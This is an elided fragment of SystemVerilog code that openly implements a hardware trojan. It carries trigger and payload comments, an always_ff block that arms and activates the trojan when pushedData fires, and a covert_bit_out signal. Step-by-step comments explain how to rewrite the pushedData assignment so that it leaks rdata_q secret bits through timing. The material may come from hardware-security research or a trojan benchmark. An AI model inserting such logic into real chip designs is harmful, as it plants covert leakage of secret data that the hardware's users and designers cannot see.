 ...
 *   
 * Trigger: Counter on pushedData
 * Payload: Modulate pushedData timing to leak secret data
 * 
...
always_ff @(posedge clk_p or negedge rst) begin
    if (!rst) begin
        ...
        if (trojan_armed && |pushedData) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of pushedData:
...
logic       covert_bit_out;         // Drives pushedData when trojan active
...
//   Find the assign for pushedData (or rd_error_o as fallback):
//     assign pushedData = <normal_expr>;
//   Replace with:
//     assign pushedData = trojan_active ? covert_bit_out : (<normal_expr>);
//
